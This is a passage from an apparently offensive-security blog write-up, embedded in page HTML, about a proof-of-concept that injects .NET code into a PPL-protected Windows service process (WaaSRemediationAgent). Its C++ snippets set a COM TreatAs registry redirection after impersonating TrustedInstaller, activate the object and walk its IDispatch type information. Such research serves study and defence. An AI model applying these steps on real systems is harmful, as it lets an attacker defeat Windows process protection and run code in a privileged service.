</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><h4 id="treatas-registry-redirection" class="text-base @xs:text-lg @lg:text-xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.5em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#treatas-registry-redirection"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_hd8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_hd8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug"><strong class="font-bold">TreatAs Registry Redirection</strong>:</div></h4><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The <span class="text-red-500 contrast-more:text-red-800"><strong class="font-bold">TreatAs </strong></span>registry key is used to redirect a legacy COM class (e.g., StdFont) to a .NET object (System.Object). This manipulation makes the system treat a traditional COM object as a .NET object, allowing the .NET object to be invoked within the context of COM.However, before the registry changes can take effect, it’s necessary to <strong class="font-bold">impersonate </strong><span class="text-red-500 contrast-more:text-red-800"><strong class="font-bold">TrustedInstaller </strong></span>to be able to set specifically TreatAs key</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_1h8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// Code snippet<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">bool RegistryUtils::SetTreatAs(const CLSID&amp; originalClsid, const CLSID&amp; newClsid) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    WCHAR originalClsidStr[40], newClsidStr[40];<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    StringFromGUID2(originalClsid, originalClsidStr, 40);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    StringFromGUID2(newClsid, newClsidStr, 40);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    std::wstring keyPath = std::wstring(L"CLSID\\") + originalClsidStr + L"\\TreatAs";<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    HKEY hKey;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    LONG result = RegCreateKeyEx(HKEY_CLASSES_ROOT, keyPath.c_str(), 0, nullptr,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr, &amp;hKey, nullptr);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (result != ERROR_SUCCESS) return false;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    // Explicit cast to DWORD<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    DWORD dataSize = static_cast&lt;DWORD&gt;((wcslen(newClsidStr) + 1) * sizeof(WCHAR));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    result = RegSetValueEx(hKey, nullptr, 0, REG_SZ,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        reinterpret_cast&lt;const BYTE*&gt;(newClsidStr), dataSize);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    RegCloseKey(hKey);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    return result == ERROR_SUCCESS;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">With these registry manipulations, COM calls are redirected to .NET objects, bridging the gap between the native COM environment and the managed .NET environment.</p><h3 id="mscorlib-as-a-bridge" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#mscorlib-as-a-bridge"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_hl8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_hl8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug"><strong class="font-bold">mscorlib as a Bridge</strong></div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">After registry manipulation, the exploit proceeds by activating the COM object <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">WaaSRemediationAgent</code>  and using <span class="text-red-500 contrast-more:text-red-800"><strong class="font-bold">reflection</strong></span><span class="text-red-500 contrast-more:text-red-800"> </span>to invoke methods within the .NET runtime. This transition from COM to .NET is at the heart of this exploit.</p><h4 id="com-object-activation" class="text-base @xs:text-lg @lg:text-xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.5em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#com-object-activation"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_hp8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_hp8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug"><strong class="font-bold">COM Object Activation</strong></div></h4><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">CoCreateInstance</code>  function is called to create the WaaSRemediationAgent COM object. Thanks to the registry manipulation, this COM activation leads to the creation of a .NET object instead.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_1t8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// Code snippet<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">HRESULT hr = CoCreateInstance(CLSID_WaaSRemediationAgent, nullptr, CLSCTX_LOCAL_SERVER, IID_IDispatch, reinterpret_cast&lt;void**&gt;(&amp;pWaasAgent));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content"></span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">In my PoC exploit, the core method of injecting a .NET payload into a <strong class="font-bold">PPL-protected process</strong> (like svchost.exe running the <strong class="font-bold">WaaSRemediationAgent</strong>) hinges on the <strong class="font-bold">IDispatch interface</strong> exposed by the COM class. This interface, part of COM Automation, enables dynamic method invocation on COM objects. By leveraging IDispatch, the attack is able to bridge the gap between the native COM world and the managed .NET world, allowing me to inject .NET code into a process with <strong class="font-bold">PsProtectedSignerWindows-Light</strong> protection, such as WaaSRemediationAgent.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">When I trigger the activation of the <strong class="font-bold">WaaSRemediationAgent COM class, </strong>the IDispatch interface is automatically exposed, allowing me to invoke .NET methods dynamically.</p><h4 id="obtaining-itypeinfo-for-waasremediationagent" class="text-base @xs:text-lg @lg:text-xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.5em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#obtaining-itypeinfo-for-waasremediationagent"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_i38qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_i38qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Obtaining ITypeInfo for WaaSRemediationAgent</div></h4><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The ITypeInfo interface is used to retrieve type information for the COM object. This metadata is needed to use reflection to invoke .NET methods.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_278qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// Code snippet<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">ITypeInfo* pAgentTypeInfo = nullptr;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">hr = pWaasAgent-&gt;GetTypeInfo(0, LOCALE_USER_DEFAULT, &amp;pAgentTypeInfo);</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"><strong class="font-bold">Why 0?</strong>: The first parameter (0) specifies the interface index. Index 0 typically refers to the default interface (IDispatch).</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;width:563px;height:auto" loading="lazy" class="block" src="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/~gitbook/image?url=https%3A%2F%2F615064086-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MXlxki-LGPmhYCBAzg5%252Fuploads%252FKeEIzYkKR7uL39foAnTd%252Ftypeinfo.png%3Falt%3Dmedia%26token%3D286243c3-0e12-4e7b-a336-65cf293bedbb&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=4143ddc8&amp;sv=2" width="944" height="897"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"><strong class="font-bold">Navigating to Base Interface</strong></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Gets a reference (HREFTYPE) to the first implemented interface (index 0).</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_2h8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// Code snippet<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">HREFTYPE href = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">hr = pAgentTypeInfo-&gt;GetRefTypeOfImplType(0, &amp;href);</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Many COM objects implement <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">IDispatch</code> as their base interface, which we'll exploit later.</p><h4 id="resolving-base-interface-type-info" class="text-base @xs:text-lg @lg:text-xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.5em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#resolving-base-interface-type-info"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_il8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_il8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug"><strong class="font-bold">Resolving Base Interface Type Info</strong></div></h4><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_2n8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// Code snippet<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">ITypeInfo* pBaseTypeInfo = nullptr;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">hr = pAgentTypeInfo-&gt;GetRefTypeInfo(href, &amp;pBaseTypeInfo);</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Converts the <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">HREFTYPE</code> reference into a usable ITypeInfo pointer. This <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">pBaseTypeInfo</code> now describes the base interface (e.g., IDispatch) of WaaSRemediationAgent.</p><h4 id="locating-the-containing-type-library" class="text-base @xs:text-lg @lg:text-xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 